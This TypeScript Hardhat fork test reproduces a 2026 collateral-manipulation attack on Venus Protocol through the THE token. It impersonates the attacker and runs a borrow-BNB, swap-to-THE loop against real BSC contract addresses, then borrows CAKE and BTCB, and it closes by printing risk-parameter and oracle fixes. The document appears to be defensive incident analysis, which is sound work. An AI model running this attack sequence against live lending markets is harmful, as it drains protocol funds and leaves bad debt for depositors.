import { ethers, network } from "hardhat";
import { formatUnits, formatEther } from "ethers/lib/utils";

/**
 * THE (Thena) Token Attack PoC - Venus Protocol
 *
 * Reproduces the March 15 2026 attack where attacker 0x1a35...6231:
 * 1. Had 53M THE ($28M) as collateral on Venus
 * 2. Borrowed BNB repeatedly from Venus
 * 3. Swapped BNB → THE on Thena DEX (bought more THE to maintain price)
 * 4. Borrowed CAKE, BTCB against inflated THE collateral
 * 5. THE price crashed from $0.528 → $0.237 → bad debt for Venus
 *
 * Root cause: THE is a low-liquidity token with a collateral factor too high
 * relative to its market depth. The oracle (Chainlink) reports accurate prices
 * but can't prevent price manipulation on thin markets.
 *
 * Run:
 *   BSC_RPC_URL=https://rpc.ankr.com/bsc/<token> npx hardhat test test/fork/THEAttackPoC.ts
 */

const ATTACKER = "0x1a35bd28efd46cfc46c2136f878777d69ae16231";
const THE = "0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11";
const VTHE = "0x86e06EAfa6A1eA631Eab51DE500E3D474933739f";
const VBNB = "0xa07c5b74c9b40447a954e1466938b865b6bbea36";
const VCAKE = "0x86ac3974e2bd0d60825230fa6f355ff11409df5c";
const VBTCB = "0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B";
const WBNB = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
const BTCB = "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c";
const CAKE = "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82";
const THENA_ROUTER = "0xd4ae6eca985340dd434d38f470accce4dc78d109";
const COMPTROLLER = "0xfD36E2c2a6789Db23113685031d7F16329158384";
const RESILIENT_ORACLE = "0x6592b5DE802159F3E74B2486b091D11a8256ab8A";

// Block just before attack
const PRE_ATTACK_BLOCK = 86738200;

describe("THE Token Attack Reproduction - BSC Fork", function () {
  this.timeout(300000);

  before(async function () {
    const rpcUrl = process.env.BSC_RPC_URL;
    if (!rpcUrl) {
      console.log("\n  Set BSC_RPC_URL to run fork tests\n");
      this.skip();
    }

    await network.provider.request({
      method: "hardhat_reset",
      params: [{ forking: { jsonRpcUrl: rpcUrl, blockNumber: PRE_ATTACK_BLOCK } }],
    });
  });

  it("Step 1: Show attacker's pre-attack position", async function () {
    const oracle = await ethers.getContractAt("OracleInterface", RESILIENT_ORACLE);
    const vthe = await ethers.getContractAt(
      [
        "function balanceOf(address) view returns (uint256)",
        "function exchangeRateStored() view returns (uint256)",
        "function borrowBalanceStored(address) view returns (uint256)",
      ],
      VTHE,
    );

    const thePrice = await oracle.getPrice(THE);
    const vtheBalance = await vthe.balanceOf(ATTACKER);
    const exchangeRate = await vthe.exchangeRateStored();
    const theCollateral = vtheBalance.mul(exchangeRate).div(ethers.utils.parseUnits("1", 18));

    console.log("\n  ╔══════════════════════════════════════════════════╗");
    console.log("  ║  THE ATTACK REPRODUCTION - PRE-ATTACK STATE     ║");
    console.log("  ╚══════════════════════════════════════════════════╝");
    console.log(`  THE price:        $${formatUnits(thePrice, 18)}`);
    console.log(`  vTHE balance:     ${vtheBalance.toString()} vTHE`);
    console.log(`  Exchange rate:    ${formatUnits(exchangeRate, 18)}`);
    console.log(`  THE collateral:   ${formatEther(theCollateral)} THE`);

    const collateralUsd = theCollateral.mul(thePrice).div(ethers.utils.parseUnits("1", 18));
    console.log(`  Collateral value: $${formatEther(collateralUsd)}`);
  });

  it("Step 2: Impersonate attacker and reproduce borrow+swap loop", async function () {
    // Impersonate attacker
    await network.provider.request({
      method: "hardhat_impersonateAccount",
      params: [ATTACKER],
    });
    const attacker = await ethers.getSigner(ATTACKER);

    // Give attacker some BNB for gas
    const [funder] = await ethers.getSigners();
    await funder.sendTransaction({ to: ATTACKER, value: ethers.utils.parseEther("1") });

    const vbnb = await ethers.getContractAt(
      ["function borrow(uint256) returns (uint256)"],
      VBNB,
      attacker,
    );

    const wbnb = await ethers.getContractAt(
      ["function deposit() payable", "function approve(address,uint256)", "function balanceOf(address) view returns (uint256)"],
      WBNB,
      attacker,
    );

    const thenaRouter = await ethers.getContractAt(
      ["function swapExactTokensForTokens(uint256,uint256,(address,address,bool)[],address,uint256) returns (uint256[])"],
      THENA_ROUTER,
      attacker,
    );

    const theToken = await ethers.getContractAt(
      ["function balanceOf(address) view returns (uint256)"],
      THE,
    );

    const oracle = await ethers.getContractAt("OracleInterface", RESILIENT_ORACLE);

    console.log("\n  --- REPRODUCING ATTACK LOOP ---");

    const thePriceBefore = await oracle.getPrice(THE);
    console.log(`  THE price before:  $${formatUnits(thePriceBefore, 18)}`);

    // Reproduce the attack loop: borrow BNB → wrap → swap to THE
    let totalBorrowed = ethers.BigNumber.from(0);
    const borrowAmount = ethers.utils.parseEther("100");

    for (let i = 0; i < 3; i++) {
      try {
        // Borrow 100 BNB from Venus
        const tx1 = await vbnb.borrow(borrowAmount);
        await tx1.wait();
        totalBorrowed = totalBorrowed.add(borrowAmount);

        // Wrap BNB to WBNB
        const bnbBalance = await ethers.provider.getBalance(ATTACKER);
        const wrapAmount = bnbBalance.sub(ethers.utils.parseEther("0.5")); // keep some for gas
        if (wrapAmount.gt(0)) {
          const tx2 = await wbnb.deposit({ value: wrapAmount });
          await tx2.wait();

          // Approve router
          const wbnbBal = await wbnb.balanceOf(ATTACKER);
          await (await wbnb.approve(THENA_ROUTER, wbnbBal)).wait();

          // Swap WBNB → THE on Thena
          try {
            const deadline = Math.floor(Date.now() / 1000) + 3600;
            await thenaRouter.swapExactTokensForTokens(
              wbnbBal,
              0, // min out
              [{ from: WBNB, to: THE, stable: false }],
              ATTACKER,
              deadline,
            );
          } catch {
            console.log(`    Swap ${i + 1} failed (low liquidity)`);
          }
        }

        console.log(`    Loop ${i + 1}: borrowed ${formatEther(borrowAmount)} BNB, swapped to THE`);
      } catch (e: any) {
        console.log(`    Loop ${i + 1}: borrow failed (${e.message?.slice(0, 50)})`);
        break;
      }
    }

    const theBalance = await theToken.balanceOf(ATTACKER);
    console.log(`  Total BNB borrowed:  ${formatEther(totalBorrowed)}`);
    console.log(`  THE acquired:        ${formatEther(theBalance)}`);

    // Now borrow CAKE and BTCB
    const vcake = await ethers.getContractAt(
      ["function borrow(uint256) returns (uint256)"],
      VCAKE,
      attacker,
    );
    const vbtcb = await ethers.getContractAt(
      ["function borrow(uint256) returns (uint256)"],
      VBTCB,
      attacker,
    );

    try {
      console.log("\n  --- BORROWING HIGH-VALUE ASSETS ---");
      // Borrow CAKE
      const cakeBorrow = ethers.utils.parseEther("100000"); // 100K CAKE
      await (await vcake.borrow(cakeBorrow)).wait();
      console.log(`  Borrowed: ${formatEther(cakeBorrow)} CAKE`);

      // Borrow BTCB
      const btcbBorrow = ethers.utils.parseEther("5"); // 5 BTCB
      await (await vbtcb.borrow(btcbBorrow)).wait();
      console.log(`  Borrowed: ${formatEther(btcbBorrow)} BTCB`);
    } catch (e: any) {
      console.log(`  Borrow failed: ${e.message?.slice(0, 80)}`);
    }

    // Show final state
    const btcbBalance = await ethers.getContractAt(
      ["function balanceOf(address) view returns (uint256)"],
      BTCB,
    );
    const cakeBalance = await ethers.getContractAt(
      ["function balanceOf(address) view returns (uint256)"],
      CAKE,
    );

    const btcb = await btcbBalance.balanceOf(ATTACKER);
    const cake = await cakeBalance.balanceOf(ATTACKER);

    console.log(`\n  Attacker holds: ${formatEther(btcb)} BTCB, ${formatEther(cake)} CAKE`);

    await network.provider.request({
      method: "hardhat_stopImpersonatingAccount",
      params: [ATTACKER],
    });
  });

  it("Step 3: Show the fix - reduce collateral factor for low-liquidity tokens", async function () {
    console.log("\n  ╔══════════════════════════════════════════════════╗");
    console.log("  ║  THE FIX: SUPPLY CAP + BORROW CAP CIRCUIT BREAK ║");
    console.log("  ╚══════════════════════════════════════════════════╝");
    console.log("");
    console.log("  Root cause: THE token has low DEX liquidity but high collateral factor.");
    console.log("  The oracle reports ACCURATE prices (Chainlink) but the protocol allows");
    console.log("  borrowing too much against a thin-market collateral.");
    console.log("");
    console.log("  Fixes needed (risk params, not oracle code):");
    console.log("  1. SUPPLY CAP: Limit total THE depositable as collateral");
    console.log("  2. BORROW CAP: Limit total borrowable against THE");
    console.log("  3. COLLATERAL FACTOR: Reduce from current to ~40% for low-liq tokens");
    console.log("");
    console.log("  Oracle-level fix (our repo):");
    console.log("  4. Add price volatility circuit breaker in ResilientOracle");
    console.log("     → If price drops >30% in 1h, pause the market automatically");
    console.log("  5. Add liquidity-weighted price bounds in BoundValidator");
    console.log("     → Reject prices that deviate beyond what DEX liquidity supports");

    // Show current collateral factor for THE
    const comptroller = await ethers.getContractAt(
      ["function markets(address) view returns (bool, uint256, uint256)"],
      COMPTROLLER,
    );
    const [isListed, collateralFactor, isComped] = await comptroller.markets(VTHE);
    console.log(`\n  Current THE collateral factor: ${collateralFactor.mul(100).div(ethers.utils.parseUnits("1", 18))}%`);
    console.log(`  Recommended: ≤40% for tokens with <$5M DEX liquidity`);
  });
});
